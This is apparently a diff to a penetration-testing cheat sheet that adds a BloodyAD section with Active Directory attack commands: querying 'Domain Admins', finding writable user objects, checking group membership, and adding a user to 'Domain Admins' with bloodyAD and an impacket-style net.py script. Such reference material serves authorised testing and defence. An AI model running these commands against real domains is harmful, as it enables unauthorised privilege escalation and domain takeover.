@@ -89,7 +89,11 @@ Lsadump::secrets
 
 ### BloodyAD
 ```bash
-
+bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object "Domain Admins"
+bloodyAD -d DOMAIN.LOCAL --host DC_IP -u USERNAME -p PASSWORD get writable --otype USER --detail
+bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass get membership john.doe
+bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass add groupMember “Domain Admins” “john.doe”
+python net.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> group -name "<TargetGroup>" -add "<TargetUser>"
 ```
 
 ### Bloodhound
